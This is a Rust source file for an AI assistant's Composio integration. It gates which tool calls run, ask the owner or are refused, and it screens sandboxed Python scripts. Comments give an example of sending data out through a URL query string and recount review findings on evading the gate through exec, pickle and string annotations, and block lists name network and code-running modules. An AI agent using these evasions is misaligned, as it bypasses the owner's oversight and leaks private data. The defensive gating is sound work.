//! Composio: the text eve's "app hands" for the long tail (port of `composio_tools.py`).
//!
//! Owner's decision, 2026-10-04: Gmail, Google Calendar, Google Drive and GitHub go direct (apps_mcp: Google's
//! own APIs, GitHub's own MCP server). Composio keeps Slack, Notion, Linear and anything else connected there, and
//! DIRECT_TOOLKITS are kept out of its session even when connected, so each app has one way in. Gmail and Google
//! Calendar are the exception that proves it (owner, 2026-10-05: "keep composio for the second gmail"): the owner's
//! own account is direct, and Composio holds only their OTHER accounts (OTHER_ACCOUNT_TOOLKITS), each call naming
//! one. What follows is the original design, unchanged for those apps.
//!
//! eve lite (EVE_PROFILE=lite, docs/plans/eve-lite.md M2): Composio Connect is its only way to any app, the owner's
//! own Gmail and Calendar included, so its verdicts are [`decide_lite`]'s: [`decide`] with `personal_direct=false`,
//! and a question before COMPOSIO_MANAGE_CONNECTIONS unless the call only checks or links ([`manage_needs_yes`]).
//!
//! Owner's decision, 2026-09-21: Gmail, Calendar, GitHub, Notion, Slack and the rest are reachable by API in
//! seconds through Composio, where driving the Mac's screen for the same job takes minutes. So the Telegram
//! brain gets Composio's session tools beside its own, and a question like "any mail from Sam today?" is one
//! API call, not a screen task.
//!
//! How it fits:
//!
//! * One Composio *session* per owner. The session's user id is derived from the Telegram owner ids
//!   (`telegram-<id>[-<id>...]`), so the connected accounts belong to the owner, never to a chat. The session id
//!   is persisted to `~/.config/eve-bridge/composio.json` and resumed on restart; a stale or foreign id falls back
//!   to a fresh session.
//! * The session exposes Composio's six meta tools (search, schemas, multi-execute, connections, remote bash,
//!   remote workbench) already shaped as Responses-API function tools, so they slot into the brain's tools.
//! * [`ComposioBridge::execute`] never fails: a failure is `{"ok": false, "reason": "<Type>: message"}` handed
//!   straight back to the model.
//! * Consequence gating is pure and lives here: [`consequential_slugs`] names the slugs in a call that do
//!   something (send, create, delete...), by the verb in the slug; [`describe_for_confirmation`] writes the
//!   yes/no line the owner sees before those run. Read-only verbs (get, list, fetch, search...) run at once.
//!
//! The API key is read from the environment by the client only ([`client::HttpComposioClient`]); this module
//! never holds, logs or prints it. Tool arguments may hold mail text, so logs carry names, counts and error
//! types only.

pub mod client;
mod pyast;
pub mod strict_schema;

use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::path::{Path, PathBuf};
use std::sync::{Arc, LazyLock};

use indexmap::IndexMap;
use parking_lot::Mutex;
use regex::Regex;
use serde_json::{json, Map, Value};

pub use client::{ComposioClient, ComposioError, ComposioSession, HttpComposioClient};
use pyast::{FirstArg, Kind};

/// The process environment or a test's, as `os.environ` / a Mapping in the Python.
pub type Environ = HashMap<String, String>;
/// Each toolkit's policy for writing calls, in the order the Python dict holds them.
pub type Policy = IndexMap<String, String>;

pub const COMPOSIO_DEFAULT: bool = false;
pub const DEFAULT_STATE_PATH: &str = "~/.config/eve-bridge/composio.json";
pub const DEFAULT_TIMEOUT_SECS: f64 = 60.0;

const ON: &[&str] = &["1", "true", "yes", "on"];

pub const MULTI_EXECUTE: &str = "COMPOSIO_MULTI_EXECUTE_TOOL";
/// The alias of the owner's own account on a toolkit with more than one: writes go there unless he names another
/// (accounts_note). Set on the connection in Composio (connected_accounts.update(<id>, alias="personal")).
pub const PRIMARY_ALIAS: &str = "personal";
/// Toolkits kept out of eve's session. composio_search is Composio's own web search and page fetch: on
/// 2026-09-30 the brain used it (COMPOSIO_SEARCH_WEB, COMPOSIO_SEARCH_FETCH_URL_CONTENT, per Composio's execution
/// log) to find a course's office hours, which costs a tool search plus a multi-execute per lookup, and ran out
/// of rounds one step before adding the events. eve's own web_search (websearch.py, routed by Jev) is one round.
/// Disabling them one by one does not hold: with composio_search off, the tool search offered Exa and SerpAPI; with
/// those off, Apify, a browser tool, Tavily's MCP variant and Agenty. So the session is made with an allow-list
/// instead (TOOLKITS): the owner's kind of apps plus whatever is connected, and nothing on the public web. Checked
/// live 2026-09-30: with it, a tool search for "search the web for a course's office hours" offers no web toolkit.
/// WEB_TOOLKITS stays as the guard behind it (web_toolkit_slugs), for EVE_COMPOSIO_TOOLKITS=all.
pub const WEB_TOOLKITS: &[&str] = &[
    "composio_search", "exa", "serpapi", "serper", "tavily", "linkup", "perplexityai", "firecrawl", "brightdata",
    "scrapingbee", "zenrows", "scrapegraph_ai", "olostep", "agentql", "apify", "hyperbrowser", "browserless",
    "browserbase_tool", "browser_tool", "tavily_mcp", "agenty",
];
/// The owner's Composio apps; connected toolkits are added at start (but never DIRECT_TOOLKITS).
/// EVE_COMPOSIO_TOOLKITS="gmail,notion" replaces this list; "all" lifts it (start then disables DIRECT_TOOLKITS and
/// a Gmail/Calendar with no other account).
pub const TOOLKITS: &[&str] = &["slack", "notion", "linear"]; // owner, 2026-10-04
/// The apps eve reaches directly (apps_mcp.SERVERS). Never in Composio's session, connected there or not, and
/// whatever EVE_COMPOSIO_TOOLKITS says: one way in per app.
pub const DIRECT_TOOLKITS: &[&str] = &["googledrive", "github"];
/// Apps whose PERSONAL account is direct (apps_mcp) and whose other accounts (the owner's work Gmail and calendar,
/// aliased "work" in Composio) stay here. Only an ACTIVE account with an alias other than PRIMARY_ALIAS joins the
/// session; an unaliased one cannot be told from the personal one, so it stays out. The session is then made in
/// multi-account mode with explicit selection, so Composio never falls back to the personal connection, and decide()
/// refuses a call that names no account or the personal one (owner, 2026-10-05).
pub const OTHER_ACCOUNT_TOOLKITS: &[&str] = &["gmail", "googlecalendar"];
pub const RUNS_CODE: &[&str] = &["COMPOSIO_REMOTE_BASH_TOOL", "COMPOSIO_REMOTE_WORKBENCH"];
/// Composio's own connection manager: for each toolkit named, a sign-in link when it is not connected, its details
/// when it is. Full eve runs it unasked (it changes nothing in the owner's apps); eve lite asks before any call whose
/// shape is not that check-or-link one (manage_needs_yes).
pub const MANAGE_CONNECTIONS: &str = "COMPOSIO_MANAGE_CONNECTIONS";
/// Its input as Composio serves it (S1, 2026-10-13: tests/fixtures/composio_connect/COMPOSIO_MANAGE_CONNECTIONS.json):
/// {toolkits: string[], reinitiate_all?: boolean (default false), session_id?: string}, no other key.
pub const MANAGE_KEYS: &[&str] = &["toolkits", "reinitiate_all", "session_id"];

/// A slug is TOOLKIT_WORDS. A call only looks when one of its words is a reading verb and none is a writing
/// verb: GMAIL_FETCH_EMAILS reads, GOOGLECALENDAR_EVENTS_LIST_ALL_CALENDARS reads (the verb is not always the
/// first word), GMAIL_SEND_EMAIL writes, GETTY_UPLOAD writes (a verb-like toolkit name proves nothing). What
/// happens to a writing call is the toolkit's POLICY below.
pub const READ_VERBS: &[&str] = &[
    "GET", "LIST", "FETCH", "SEARCH", "FIND", "READ", "RETRIEVE", "LOOKUP", "CHECK", "COUNT", "DESCRIBE", "QUERY",
    "VIEW", "DOWNLOAD", "SHOW", "PREVIEW",
];
pub const WRITE_VERBS: &[&str] = &[
    "SEND", "CREATE", "DELETE", "REMOVE", "UPDATE", "EDIT", "MODIFY", "POST", "PUBLISH", "PAY", "MERGE", "TRANSFER",
    "SUBMIT", "CANCEL", "ARCHIVE", "TRASH", "REPLY", "FORWARD", "INVITE", "SHARE", "ADD", "SET", "MOVE", "UPLOAD",
    "INSERT", "WRITE", "PATCH", "PUT", "EXECUTE", "RUN", "TRIGGER", "MARK", "LABEL", "ASSIGN", "CLOSE", "REVOKE",
    "GRANT", "RENAME", "COPY", "IMPORT", "SYNC", "RESET", "CLEAR", "PURGE", "BATCH", "DRAFT", "COMPOSE", "SCHEDULE",
    "BOOK", "ORDER", "ACCEPT", "DECLINE", "APPROVE", "REJECT", "DISABLE", "ENABLE", "STAR", "UNSTAR", "PIN", "BUY",
    "PURCHASE", "CHARGE", "WITHDRAW", "DEPLOY",
];
/// Words that are also plain nouns: a write only in verb position (the first word after the toolkit). Live,
/// 2026-09-23: GMAIL_GET_LABEL (read the INBOX label, i.e. the unread count) was refused as a write under the
/// owner's "gmail: read" policy. Tools that change labels carry a real verb too: ADD_LABEL, MODIFY_…_LABELS.
pub const NOUN_TOO: &[&str] = &["LABEL", "DRAFT", "ORDER", "RUN", "SCHEDULE"]; // GET_DRAFT, GET_ORDER, GET_A_WORKFLOW_RUN…
/// The shape; the words decide (is_read_only). Python's `re.match` with `$`, which also matches before a final
/// newline.
pub static READ_ONLY_SLUG: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^[A-Za-z0-9]+_[A-Za-z0-9_]+\n?$").expect("static regex"));

/// Per-toolkit policy for a call that WRITES (owner, 2026-09-21: "make gmail read only, allow write for
/// calendar"). read: a writing call is refused, never asked; auto/write: understood routine changes run,
/// consequential or unknown changes ask; ask: every change asks. Reading calls always run.
/// EVE_COMPOSIO_POLICY="gmail=read,googlecalendar=write,slack=ask" overrides or extends this.
pub const DEFAULT_TOOLKIT_POLICY: [(&str, &str); 3] = [("gmail", "read"), ("googlecalendar", "auto"), ("googledrive", "auto")];
pub const POLICIES: &[&str] = &["read", "auto", "write", "ask"];

pub const VALUE_CLIP: usize = 60;
pub const LINE_CLIP: usize = 300;

/// The default policy as a [`Policy`].
pub fn default_toolkit_policy() -> Policy {
    DEFAULT_TOOLKIT_POLICY.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
}

fn is_write_verb(w: &str) -> bool {
    WRITE_VERBS.contains(&w)
}

// -- Python's str helpers --

/// `str.isspace()` for one character: Unicode White_Space plus the separators U+001C-U+001F.
fn is_space(c: char) -> bool {
    c.is_whitespace() || ('\u{1c}'..='\u{1f}').contains(&c)
}

/// `str.strip()`.
pub(crate) fn py_strip(s: &str) -> &str {
    s.trim_matches(is_space)
}

/// `str.split()` with no argument.
fn py_split(s: &str) -> Vec<&str> {
    s.split(is_space).filter(|w| !w.is_empty()).collect()
}

/// Python truthiness of an optional JSON value (a missing key is None).
pub(crate) fn truthy(v: Option<&Value>) -> bool {
    v.is_some_and(eve_tool_gate::py_truthy)
}

/// `str(value or "")`.
fn str_or_empty(v: Option<&Value>) -> String {
    match v {
        Some(v) if eve_tool_gate::py_truthy(v) => eve_tool_gate::py_str(v),
        _ => String::new(),
    }
}

/// `int(text)` for a string (surrounding whitespace, a sign, `_` between digits); None where Python raises or
/// the number does not fit.
pub(crate) fn py_int(text: &str) -> Option<i64> {
    let t = py_strip(text);
    let (neg, body) = match t.as_bytes().first() {
        Some(b'+') => (false, &t[1..]),
        Some(b'-') => (true, &t[1..]),
        _ => (false, t),
    };
    if body.is_empty() || body.starts_with('_') || body.ends_with('_') || body.contains("__") {
        return None;
    }
    let digits: String = body.chars().filter(|c| *c != '_').collect();
    if !digits.chars().all(|c| c.is_ascii_digit()) {
        return None;
    }
    let n: i64 = digits.parse().ok()?;
    Some(if neg { -n } else { n })
}

fn chars(s: &str) -> usize {
    s.chars().count()
}

fn char_prefix(s: &str, n: usize) -> &str {
    match s.char_indices().nth(n) {
        Some((i, _)) => &s[..i],
        None => s,
    }
}

// -- configuration --

/// What the bridge needs. No key here: the client reads `COMPOSIO_API_KEY` from the environment itself.
#[derive(Debug, Clone, PartialEq)]
pub struct ComposioConfig {
    pub enabled: bool,
    pub user_id: String,
    pub state_path: PathBuf,
    pub timeout_secs: f64,
    /// The allow-list; None: no limit ("all").
    pub toolkits: Option<Vec<String>>,
}

impl ComposioConfig {
    /// The dataclass with its defaults (the state path as written, `~` not expanded, as the Python default is).
    pub fn new(enabled: bool, user_id: impl Into<String>) -> Self {
        ComposioConfig {
            enabled,
            user_id: user_id.into(),
            state_path: PathBuf::from(DEFAULT_STATE_PATH),
            timeout_secs: DEFAULT_TIMEOUT_SECS,
            toolkits: Some(TOOLKITS.iter().map(|t| t.to_string()).collect()),
        }
    }
}

fn truthy_str(value: Option<&String>) -> bool {
    let v = value.map(|s| py_strip(s).to_lowercase()).unwrap_or_default();
    ON.contains(&v.as_str())
}

/// Read the switch and the surroundings. On only when the switch, the key and an owner are all there.
/// `environ` None reads the process environment.
pub fn configured(environ: Option<&Environ>, owner_ids: &BTreeSet<i64>) -> ComposioConfig {
    let process: Environ;
    let env = match environ {
        Some(e) => e,
        None => {
            process = std::env::vars().collect();
            &process
        }
    };
    let get = |k: &str| env.get(k).filter(|v| !v.is_empty());
    let asked = if env.contains_key("EVE_COMPOSIO") { truthy_str(env.get("EVE_COMPOSIO")) } else { COMPOSIO_DEFAULT };
    let has_key = !py_strip(env.get("COMPOSIO_API_KEY").map(String::as_str).unwrap_or("")).is_empty();
    let has_owner = !owner_ids.is_empty();
    let enabled = asked && has_key && has_owner;
    if asked && !enabled {
        let missing: Vec<&str> = [("COMPOSIO_API_KEY", has_key), ("a Telegram owner id", has_owner)]
            .iter()
            .filter(|(_, ok)| !ok)
            .map(|(name, _)| *name)
            .collect();
        tracing::warn!("composio: asked for (EVE_COMPOSIO) but missing {}; staying off", missing.join(" and "));
    }
    let ids: Vec<String> = owner_ids.iter().map(|i| i.to_string()).collect();
    let user_id = format!("telegram-{}", ids.join("-"));
    let state_raw = get("EVE_COMPOSIO_STATE").map(String::as_str).unwrap_or(DEFAULT_STATE_PATH);
    let state_path = eve_apps_mcp::py::expanduser(Path::new(state_raw));
    let mut timeout = match get("EVE_COMPOSIO_TIMEOUT_SECS") {
        Some(raw) => eve_apps_mcp::py::parse_float(raw).unwrap_or(DEFAULT_TIMEOUT_SECS),
        None => DEFAULT_TIMEOUT_SECS,
    };
    if timeout <= 0.0 {
        timeout = DEFAULT_TIMEOUT_SECS;
    }
    let raw = py_strip(env.get("EVE_COMPOSIO_TOOLKITS").map(String::as_str).unwrap_or("")).to_lowercase();
    let toolkits = if raw == "all" {
        None
    } else if !raw.is_empty() {
        let mut seen: Vec<String> = Vec::new();
        for t in raw.split(',') {
            let t = py_strip(t);
            if !t.is_empty() && !seen.iter().any(|s| s == t) {
                seen.push(t.to_string());
            }
        }
        Some(seen)
    } else {
        Some(TOOLKITS.iter().map(|t| t.to_string()).collect())
    };
    ComposioConfig { enabled, user_id, state_path, timeout_secs: timeout, toolkits }
}

// -- pure: which calls ask first, and how the question reads --

/// ("gmail", ["FETCH", "EMAILS"]) from GMAIL_FETCH_EMAILS: the toolkit and the words after it.
pub fn slug_words(slug: &str) -> (String, Vec<String>) {
    let upper = py_strip(slug).to_uppercase();
    let parts: Vec<String> = upper.split('_').filter(|w| !w.is_empty()).map(str::to_string).collect();
    if parts.len() < 2 {
        return (parts.first().map(|p| p.to_lowercase()).unwrap_or_default(), Vec::new());
    }
    (parts[0].to_lowercase(), parts[1..].to_vec())
}

pub fn is_read_only(slug: &str) -> bool {
    if !READ_ONLY_SLUG.is_match(slug) {
        return false;
    }
    let (_toolkit, words) = slug_words(slug);
    let writes = words.iter().enumerate().any(|(i, w)| is_write_verb(w) && (!NOUN_TOO.contains(&w.as_str()) || i == 0));
    words.iter().any(|w| READ_VERBS.contains(&w.as_str())) && !writes
}

/// The per-toolkit policy for writing calls: the defaults, then EVE_COMPOSIO_POLICY on top.
pub fn toolkit_policy(environ: Option<&Environ>) -> Policy {
    let raw = match environ {
        Some(e) => e.get("EVE_COMPOSIO_POLICY").cloned().unwrap_or_default(),
        None => std::env::var("EVE_COMPOSIO_POLICY").unwrap_or_default(),
    };
    let mut policy = default_toolkit_policy();
    for piece in raw.split(',') {
        let piece = py_strip(piece).to_lowercase();
        let Some((toolkit, value)) = piece.split_once('=') else { continue };
        if toolkit.is_empty() {
            continue;
        }
        if !POLICIES.contains(&value) {
            let shown = eve_app_registry::py_repr(&Value::String(value.to_string()));
            tracing::warn!(
                "composio: EVE_COMPOSIO_POLICY has {} for {}; one of ('read', 'auto', 'write', 'ask')",
                shown,
                toolkit
            );
            continue;
        }
        policy.insert(toolkit.to_string(), value.to_string());
    }
    policy
}

/// The items of a multi-execute that are mappings (`args["tools"]` when it is a list).
fn multi_execute_tools(args: &Value) -> Vec<&Map<String, Value>> {
    match args.get("tools") {
        Some(Value::Array(tools)) => tools.iter().filter_map(Value::as_object).collect(),
        _ => Vec::new(),
    }
}

/// The slugs in a multi-execute that belong to a web search or scraping toolkit (the toolkit is the slug's
/// prefix, and some toolkit names hold an underscore, so the prefix is matched, not the first word).
pub fn web_toolkit_slugs(name: &str, args: &Value) -> Vec<String> {
    if name != MULTI_EXECUTE {
        return Vec::new();
    }
    multi_execute_tools(args)
        .into_iter()
        .map(|tool| py_strip(&str_or_empty(tool.get("tool_slug"))).to_uppercase())
        .filter(|slug| starts_with_web_toolkit(slug))
        .collect()
}

fn starts_with_web_toolkit(upper_slug: &str) -> bool {
    WEB_TOOLKITS.iter().any(|t| upper_slug.starts_with(&format!("{}_", t.to_uppercase())))
}

// -- the workbench: code that only computes runs without a question (owner, 2026-09-30) --
//
// "I don't want it to ask me permissions regarding this": eve asked before a workbench script that read the
// calendar results it had just fetched and picked out the NLP lectures. The workbench runs Python in Composio's
// sandbox with helpers preloaded (docs.composio.dev/docs/workbench, 2026-09-30): run_composio_tool, invoke_llm,
// upload_local_file, proxy_execute, web_search, smart_file_extract. run_composio_tool can call any connected
// tool, GMAIL_SEND_EMAIL included, so a blanket yes would walk around the per-toolkit policy. Instead the code is
// read here (parsed, never run): a script that only computes runs; each run_composio_tool slug it names is judged
// like a multi-execute slug; anything that reaches out another way, or hides what it calls, still asks.
pub const WORKBENCH: &str = "COMPOSIO_REMOTE_WORKBENCH";
pub const WORKBENCH_TOOL_HELPER: &str = "run_composio_tool";
pub const WORKBENCH_READ_HELPERS: &[&str] = &["invoke_llm", "web_search", "smart_file_extract"];
/// Publish a file / a raw API call.
pub const WORKBENCH_ASK_HELPERS: &[&str] = &["upload_local_file", "proxy_execute"];
/// Standard modules for working on data; anything else imported (requests, subprocess, os, socket…) asks.
pub const WORKBENCH_IMPORTS: &[&str] = &[
    "json", "re", "math", "statistics", "datetime", "zoneinfo", "time", "calendar", "collections", "itertools",
    "functools", "operator", "string", "textwrap", "difflib", "decimal", "fractions", "random", "csv", "html",
    "unicodedata", "dataclasses", "typing", "enum", "copy", "pprint", "heapq", "bisect", "base64", "hashlib", "uuid",
    "pandas", "numpy", "dateutil",
];
/// Helpers that evaluate a string annotation as code (review A2, 2026-10-18): the AST reads
/// `x: "run_composio_tool(…)"` or `list["…"]` as a plain string, so the call inside was never judged. typing and
/// functools stay allowed; these names, by name, attribute or import alias, ask.
pub const WORKBENCH_EVALS_STRINGS: &[&str] =
    &["get_type_hints", "ForwardRef", "evaluate_forward_ref", "get_annotations", "singledispatch", "singledispatchmethod"];
/// pandas and numpy readers that take a URL (owner decision, 2026-10-18; was lite only): a script can put the
/// owner's data in a query string, `pd.read_csv("https://x/?d=" + rows)`, and nothing leaves through a slug the
/// gate could judge. Every profile asks before a script that names one, whatever it is given to read.
pub const WORKBENCH_FETCH_READERS: &[&str] = &[
    "read_csv", "read_table", "read_fwf", "read_json", "read_html", "read_xml", "read_excel", "read_parquet",
    "read_orc", "read_feather", "read_stata", "read_sas", "read_spss", "read_gbq", "genfromtxt", "loadtxt",
    "DataSource",
];
/// Names that reach outside the data, or that hide what the code calls. Present at all: ask. (Joined with
/// WORKBENCH_EVALS_STRINGS and WORKBENCH_FETCH_READERS in [`WORKBENCH_BLOCKED_NAMES`].)
const WORKBENCH_BLOCKED_NAMES_OWN: &[&str] = &[
    "exec", "eval", "compile", "__import__", "getattr", "setattr", "delattr", "globals", "locals", "vars",
    "importlib", "os", "sys", "subprocess", "socket", "shutil", "requests", "httpx", "urllib", "http", "aiohttp",
    "ftplib", "smtplib", "pathlib", "builtins", "ctypes", "multiprocessing", "threading", "asyncio", "pickle",
    "marshal", "composio", "pd_read_url",
    // Lean AppsPolicy finding 5 (2026-10-05): `__builtins__` (any name starting "_", below) reached exec, and a
    // file written with open() then unpickled ran code. open() itself stays: scripts read Composio's saved
    // results with it (CALENDAR_SCRIPT in the tests); the loaders that run what a file holds are blocked.
    "breakpoint", "input", "attrgetter", "methodcaller",
];
/// Attributes that run code hidden from this reading: pickle loaders (pd.read_pickle, also from a data: URL; HDF
/// stores unpickle object columns), pandas' own expression evaluators, and the operator module's name-by-string
/// lookups. Any name or attribute holding "pickle" is blocked as well (workbench_slugs).
const WORKBENCH_BLOCKED_ATTRS_OWN: &[&str] = &["eval", "exec", "query", "attrgetter", "methodcaller", "read_hdf", "HDFStore"];

pub static WORKBENCH_BLOCKED_NAMES: LazyLock<BTreeSet<&'static str>> = LazyLock::new(|| {
    WORKBENCH_BLOCKED_NAMES_OWN
        .iter()
        .chain(WORKBENCH_EVALS_STRINGS.iter())
        .chain(WORKBENCH_FETCH_READERS.iter())
        .copied()
        .collect()
});
pub static WORKBENCH_BLOCKED_ATTRS: LazyLock<BTreeSet<&'static str>> = LazyLock::new(|| {
    WORKBENCH_BLOCKED_ATTRS_OWN
        .iter()
        .chain(WORKBENCH_EVALS_STRINGS.iter())
        .chain(WORKBENCH_FETCH_READERS.iter())
        .copied()
        .collect()
});

fn workbench_import_ok(module: &str) -> bool {
    let top = module.split('.').next().unwrap_or("");
    !top.is_empty() && WORKBENCH_IMPORTS.contains(&top)
}

/// The tool slugs a workbench script calls through run_composio_tool, in order, when the script is plain enough
/// to judge; None when it must be asked about (unparseable, a blocked name or import, a helper that reaches out, a
/// slug that is not a string literal, any name or attribute starting with "_", or a pickle loader).
pub fn workbench_slugs(code: Option<&Value>) -> Option<Vec<String>> {
    let Some(Value::String(code)) = code else { return None };
    if py_strip(code).is_empty() {
        return None;
    }
    let tree = pyast::parse_module(code)?;
    let nodes = pyast::walk(&tree);
    let mut slugs: Vec<String> = Vec::new();
    for node in &nodes {
        match &node.kind {
            Kind::Import(mods) => {
                if mods.iter().any(|m| !workbench_import_ok(m)) {
                    return None;
                }
            }
            Kind::ImportFrom { module, level } => {
                if *level != 0 {
                    return None;
                }
                if !workbench_import_ok(module.as_deref().unwrap_or("")) {
                    return None;
                }
            }
            Kind::Name(id) => {
                if id.starts_with('_')
                    || WORKBENCH_BLOCKED_NAMES.contains(id.as_str())
                    || WORKBENCH_ASK_HELPERS.contains(&id.as_str())
                    || id.to_lowercase().contains("pickle")
                {
                    return None;
                }
            }
            Kind::Attribute(attr) => {
                if attr.starts_with('_')
                    || WORKBENCH_ASK_HELPERS.contains(&attr.as_str())
                    || attr == WORKBENCH_TOOL_HELPER
                    || WORKBENCH_BLOCKED_ATTRS.contains(attr.as_str())
                    || attr.to_lowercase().contains("pickle")
                {
                    return None;
                }
            }
            Kind::Keyword(Some(arg)) if arg == "allow_pickle" => return None,
            Kind::Alias(name) => {
                if name.starts_with('_')
                    || name.to_lowercase().contains("pickle")
                    || WORKBENCH_BLOCKED_NAMES.contains(name.as_str())
                    || WORKBENCH_BLOCKED_ATTRS.contains(name.as_str())
                {
                    return None;
                }
            }
            Kind::Call { func_name: Some(f), first } if f == WORKBENCH_TOOL_HELPER => match first {
                FirstArg::Str(s) if !py_strip(s).is_empty() => slugs.push(py_strip(s).to_string()),
                _ => return None,
            },
            _ => {}
        }
    }
    // The helper's name used any way but a direct call (aliased, passed around) hides which tool runs.
    let direct = nodes
        .iter()
        .filter(|n| matches!(&n.kind, Kind::Call { func_name: Some(f), .. } if f == WORKBENCH_TOOL_HELPER))
        .count();
    let named = nodes.iter().filter(|n| matches!(&n.kind, Kind::Name(id) if id == WORKBENCH_TOOL_HELPER)).count();
    if named != direct {
        return None;
    }
    Some(slugs)
}

fn code_of(args: &Value) -> Option<&Value> {
    args.as_object().and_then(|m| m.get("code_to_execute"))
}

/// The slugs in this call that change something, in call order. Empty means the call only looks.
pub fn consequential_slugs(name: &str, args: &Value) -> Vec<String> {
    if name == WORKBENCH {
        return match workbench_slugs(code_of(args)) {
            None => vec![name.to_string()],
            Some(inner) => inner.into_iter().filter(|s| !is_read_only(s)).collect(),
        };
    }
    if RUNS_CODE.contains(&name) {
        return vec![name.to_string()];
    }
    if name == MULTI_EXECUTE {
        return multi_execute_tools(args)
            .into_iter()
            .map(|tool| py_strip(&str_or_empty(tool.get("tool_slug"))).to_string())
            .filter(|slug| !slug.is_empty() && !is_read_only(slug))
            .collect();
    }
    Vec::new()
}

/// What happens to a call: it runs, the owner is asked, or it is refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Action {
    Run,
    Ask,
    Refuse,
}

impl Action {
    pub fn as_str(self) -> &'static str {
        match self {
            Action::Run => "run",
            Action::Ask => "ask",
            Action::Refuse => "refuse",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Decision {
    /// run | ask | refuse
    pub action: Action,
    /// The writing slugs that decided it (empty for run).
    pub slugs: Vec<String>,
    /// One line for the owner or the log.
    pub why: String,
}

impl Decision {
    pub fn new(action: Action, slugs: Vec<String>, why: impl Into<String>) -> Self {
        Decision { action, slugs, why: why.into() }
    }
}

fn is_other_account(toolkit: &str) -> bool {
    OTHER_ACCOUNT_TOOLKITS.contains(&toolkit)
}

/// The Gmail or Google Calendar slugs in a call that would reach the owner's own account through Composio: a
/// multi-execute item naming no account or the personal one, or a workbench script calling one (a script cannot
/// name its account). Those are direct now (OTHER_ACCOUNT_TOOLKITS, 2026-10-05).
fn personal_account_slugs(name: &str, args: &Value) -> Vec<String> {
    let mut out = Vec::new();
    if name == MULTI_EXECUTE {
        for tool in multi_execute_tools(args) {
            let slug = py_strip(&str_or_empty(tool.get("tool_slug"))).to_string();
            let account = py_strip(&str_or_empty(tool.get("account"))).to_lowercase();
            if is_other_account(&slug_words(&slug).0) && (account.is_empty() || account == PRIMARY_ALIAS) {
                out.push(slug);
            }
        }
    } else if name == WORKBENCH {
        let inner = workbench_slugs(code_of(args)).unwrap_or_default();
        out = inner.into_iter().filter(|s| is_other_account(&slug_words(s).0)).collect();
    }
    out
}

/// Reads run; known routine writes follow policy and their arguments. A mixed call takes the strictest verdict:
/// refuse beats ask beats run. Opaque remote code and unclassified writes ask.
///
/// `personal_direct`: the owner's own Gmail and Google Calendar have their own tools (apps_mcp), so a call that
/// reaches them through Composio is refused (OTHER_ACCOUNT_TOOLKITS). eve lite passes false: it has no direct apps,
/// and Composio is the only way to the owner's own mail and calendar. Every other rule is the same either way.
/// Python's default is `personal_direct=True`.
pub fn decide(name: &str, args: &Value, policy: Option<&Policy>, personal_direct: bool) -> Decision {
    if name == MULTI_EXECUTE {
        let inspectable = match args.get("tools") {
            Some(Value::Array(tools)) if args.is_object() => tools.iter().all(|t| match t {
                Value::Object(t) => matches!(t.get("tool_slug"), Some(Value::String(s)) if !py_strip(s).is_empty()),
                _ => false,
            }),
            _ => false,
        };
        if !inspectable {
            // the backend must never receive items the local gate could not inspect
            return Decision::new(Action::Ask, vec![name.to_string()], "");
        }
    }
    let personal = if personal_direct { personal_account_slugs(name, args) } else { Vec::new() };
    if !personal.is_empty() {
        return Decision::new(
            Action::Refuse,
            personal,
            "that is the owner's own account, reached with its own tools; through COMPOSIO only their other \
             account runs, named in \"account\"",
        );
    }
    let slugs = consequential_slugs(name, args);
    if slugs.is_empty() {
        return Decision::new(Action::Run, Vec::new(), "");
    }
    let pol = policy.cloned().unwrap_or_else(default_toolkit_policy);
    let calls: Vec<(String, Option<&Value>)> = if name == MULTI_EXECUTE {
        multi_execute_tools(args)
            .into_iter()
            .map(|t| (py_strip(&eve_tool_gate::py_str(&t["tool_slug"])).to_string(), t.get("arguments")))
            .collect()
    } else {
        slugs.iter().map(|s| (s.clone(), None)).collect()
    };
    let mut verdicts: Vec<(String, Action)> = Vec::new();
    for (slug, arguments) in calls {
        if !slugs.contains(&slug) {
            continue;
        }
        let (toolkit, words) = slug_words(&slug);
        let rule = if RUNS_CODE.contains(&slug.as_str()) {
            "ask".to_string()
        } else {
            pol.get(&toolkit).cloned().unwrap_or_else(|| "auto".to_string())
        };
        let action = if rule == "read" {
            Action::Refuse
        } else if (rule == "auto" || rule == "write")
            && eve_apps_mcp::routine_write(&toolkit, &words.join("_"), arguments)
        {
            Action::Run
        } else {
            Action::Ask
        };
        verdicts.push((slug, action));
    }
    let refused: Vec<String> = verdicts.iter().filter(|(_, v)| *v == Action::Refuse).map(|(s, _)| s.clone()).collect();
    if !refused.is_empty() {
        let kits: BTreeSet<String> = refused.iter().map(|s| slug_words(s).0).collect();
        let kits: Vec<String> = kits.into_iter().collect();
        let why = format!("{} is read only here; {} will not run", kits.join(", "), refused.join(", "));
        return Decision::new(Action::Refuse, refused, why);
    }
    let asked: Vec<String> = verdicts.iter().filter(|(_, v)| *v == Action::Ask).map(|(s, _)| s.clone()).collect();
    if !asked.is_empty() {
        return Decision::new(Action::Ask, asked, "");
    }
    Decision::new(Action::Run, Vec::new(), format!("allowed to write: {}", slugs.join(", ")))
}

/// Whether a COMPOSIO_MANAGE_CONNECTIONS call needs the owner's yes in eve lite. False for exactly the shape that
/// only checks or links (S1, 2026-10-13: the tool's own description): a mapping with no key but MANAGE_KEYS,
/// `toolkits` a non-empty list of non-empty strings, `reinitiate_all` absent or false, `session_id` absent or a
/// string. For a toolkit not connected it answers a sign-in link, for one connected its details. Anything else is
/// true: `reinitiate_all` replaces live connections, and a shape this code does not know (a remove or rename that
/// Connect's live schema may have, a value of the wrong type) is asked, never guessed.
pub fn manage_needs_yes(args: &Value) -> bool {
    let Value::Object(args) = args else { return true };
    if !args.keys().all(|k| MANAGE_KEYS.contains(&k.as_str())) {
        return true;
    }
    match args.get("toolkits") {
        Some(Value::Array(t)) if !t.is_empty() && t.iter().all(|x| x.as_str().is_some_and(|s| !py_strip(s).is_empty())) => {}
        _ => return true,
    }
    if let Some(r) = args.get("reinitiate_all") {
        if *r != Value::Bool(false) {
            return true;
        }
    }
    args.get("session_id").is_some_and(|s| !s.is_string())
}

/// Gmail's sending verbs, in a slug's words: a send, a reply, a forward (GMAIL_SEND_EMAIL, GMAIL_REPLY_TO_THREAD,
/// GMAIL_FORWARD_MESSAGE, GMAIL_SEND_DRAFT).
